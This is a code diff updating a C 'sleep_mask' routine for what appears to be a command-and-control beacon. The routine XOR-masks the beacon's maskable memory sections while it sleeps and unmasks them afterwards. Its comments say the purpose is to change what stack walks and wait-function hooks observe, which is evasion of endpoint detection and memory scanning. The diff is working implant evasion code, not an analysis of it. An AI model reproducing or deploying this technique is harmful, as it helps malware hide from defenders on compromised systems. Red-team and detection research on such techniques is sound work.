@@ -70,7 +70,7 @@ static DWORD get_sleep_ms( PFUNCTION_CALL fc ) {
  * beaconInfo:    describes the beacon image, heap records, and memory regions
  * functionCall:  the API call to execute (with optional masking)
  */
-VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
+VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
 
     if ( ! functionCall )
         return;
@@ -90,17 +90,25 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
      * changes what a stack walk or NtWaitForSingleObject hook observes.
      */
 
-    unsigned char *key     = beaconInfo->rc4_key;
-    unsigned int   key_len = 16;
+    unsigned char *key     = (unsigned char *) beaconInfo->mask;
+    unsigned int   key_len = MASK_SIZE;
 
     DWORD sleep_ms = get_sleep_ms( functionCall );
 
-    /* -- Mask: XOR all beacon memory regions -- */
-    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
-        if ( beaconInfo->regions[i].base && beaconInfo->regions[i].size ) {
+    /* -- Mask: XOR all maskable sections across all memory regions -- */
+    for ( int r = 0; r < 6; r++ ) {
+        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
+            continue;
+        for ( int s = 0; s < 8; s++ ) {
+            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
+            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
+                continue;
+            if ( ! sec->MaskSection )
+                continue;
             xor_region(
-                (unsigned char *) beaconInfo->regions[i].base,
-                beaconInfo->regions[i].size,
+                (unsigned char *) sec->BaseAddress,
+                (unsigned int) sec->VirtualSize,
                 key, key_len
             );
         }
@@ -122,11 +130,19 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
     functionCall->retValue = 0;
 
     /* -- Unmask: XOR again to restore -- */
-    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
-        if ( beaconInfo->regions[i].base && beaconInfo->regions[i].size ) {
+    for ( int r = 0; r < 6; r++ ) {
+        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
+            continue;
+        for ( int s = 0; s < 8; s++ ) {
+            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
+            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
+                continue;
+            if ( ! sec->MaskSection )
+                continue;
             xor_region(
-                (unsigned char *) beaconInfo->regions[i].base,
-                beaconInfo->regions[i].size,
+                (unsigned char *) sec->BaseAddress,
+                (unsigned int) sec->VirtualSize,
                 key, key_len
             );
         }
